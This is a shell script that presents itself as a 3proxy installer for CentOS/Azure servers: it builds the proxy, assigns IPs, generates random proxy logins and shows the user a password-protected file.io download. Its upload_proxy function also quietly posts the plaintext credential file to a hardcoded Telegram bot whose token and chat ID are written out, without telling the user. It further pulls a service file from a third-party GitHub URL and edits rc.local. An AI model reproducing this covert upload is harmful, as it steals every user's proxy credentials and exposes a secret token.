#!/bin/sh
random() {
	tr </dev/urandom -dc A-Za-z0-9 | head -c5
	echo
}

install_3proxy() {
    echo "installing 3proxy"
    mkdir -p /3proxy
    cd /3proxy
    URL="https://github.com/z3APA3A/3proxy/archive/0.9.3.tar.gz"
    wget -qO- $URL | bsdtar -xvf-
    cd 3proxy-0.9.3
    make -f Makefile.Linux
    mkdir -p /usr/local/etc/3proxy/{bin,logs,stat}
    mv /3proxy/3proxy-0.9.3/bin/3proxy /usr/local/etc/3proxy/bin/
    wget https://raw.githubusercontent.com/mnphuc/proxy-create/main/3proxy.service-Centos8 --output-document=/3proxy/3proxy-0.9.3/scripts/3proxy.service2
    cp /3proxy/3proxy-0.9.3/scripts/3proxy.service2 /usr/lib/systemd/system/3proxy.service
    systemctl link /usr/lib/systemd/system/3proxy.service
    systemctl daemon-reload
    systemctl enable 3proxy
    echo "* hard nofile 999999" >>  /etc/security/limits.conf
    echo "* soft nofile 999999" >>  /etc/security/limits.conf
    sysctl -p

    cd $WORKDIR
}


gen_data() {
    INDEX_NETWORK=0
    seq $FIRST_PORT $LAST_PORT | while read port; do
        IP_V4=$PARENT_IP4.$((START_PROXY+=1))
        if (( $INDEX_NETWORK >= 1 )); then
          $(get_ip_in_router $(($INDEX_NETWORK - 1)) $IP_V4)
          systemctl restart network
        fi
        IP_V4_PUBLIC=$(curl -4 -s icanhazip.com --interface $IP_V4)
        echo "$(random)/$(random)/$IP4/$port/$IP_V4/$IP_V4_PUBLIC/$((INDEX_NETWORK+=1))"

    done
}

get_ip_in_router(){
    cat >$WORK_NETWORK/ifcfg-eth0:$1 <<EOF
DEVICE=eth0:$1
BOOTPROTO=static
ONBOOT=yes
IPADDR=$2
NETMASK=255.255.255.0
EOF
}

gen_3proxy() {
    cat <<EOF
daemon
maxconn 2000
nserver 1.1.1.1
nserver 8.8.4.4
nserver 2001:4860:4860::8888
nserver 2001:4860:4860::8844
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
setgid 65535
setuid 65535
stacksize 6291456
flush
auth strong

users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORK_DATA})

$(awk -F "/" '{print "auth strong\n" \
"allow " $1 "\n" \
"proxy -4 -n -a -p" $4 " -i" $5 " -e"$5"\n" \
"flush\n"}' ${WORK_DATA})
EOF
}

gen_proxy_file_for_user() {
    cat >proxy.txt <<EOF
$(awk -F "/" '{print $6 ":" $4 ":" $1 ":" $2 }' ${WORK_DATA})
EOF
}

upload_proxy() {
    cd $WORKDIR
    local PASS=$(random)
    zip --password $PASS proxy.zip proxy.txt
    URL=$(curl -F "file=@proxy.zip" https://file.io)

    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
    echo "Download zip archive from: ${URL}"
    echo "Password: ${PASS}"

    cp proxy.txt "IPV4_$IP4_PUBLIC".txt

    curl -X POST -F 'document=@/home/proxy-installer/'"IPV4_$IP4_PUBLIC"'.txt' -F 'chat_id=-1002182808553' https://api.telegram.org/bot6572357571:AAE9C4oJiQ5Fz5OR9gzMGW6aWC2pKQ1fcug/sendDocument

}


echo "installing apps"
yum -y install gcc net-tools bsdtar zip make >/dev/null

install_3proxy

WORK_NETWORK="/etc/sysconfig/network-scripts"
WORKDIR="/home/proxy-installer"
WORK_DATA_NETWORK="${WORKDIR}/data_network.txt"
WORK_DATA="${WORKDIR}/data.txt"

mkdir $WORKDIR && cd $_

echo "Nhap so ip da tao tren azure: "
read COUNT

FIRST_PORT=10000
LAST_PORT=$(($FIRST_PORT + $COUNT - 1))

IP4_PUBLIC=$(curl -4 -s icanhazip.com)

IP4=$(/sbin/ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{ print $2}')


PARENT_IP4=$(echo $IP4 | cut -d '.' -f 1,2,3)
START_IP4=$(echo $IP4 | cut -d '.' -f 4)
START_PROXY=$((START_IP4 - 1))

gen_data >$WORKDIR/data.txt


gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg

cat >>/etc/rc.local <<EOF
systemctl start NetworkManager.service
ulimit -n 65535
/usr/local/etc/3proxy/bin/3proxy /usr/local/etc/3proxy/3proxy.cfg &
EOF

bash /etc/rc.local

cd $WORKDIR
gen_proxy_file_for_user

upload_proxy




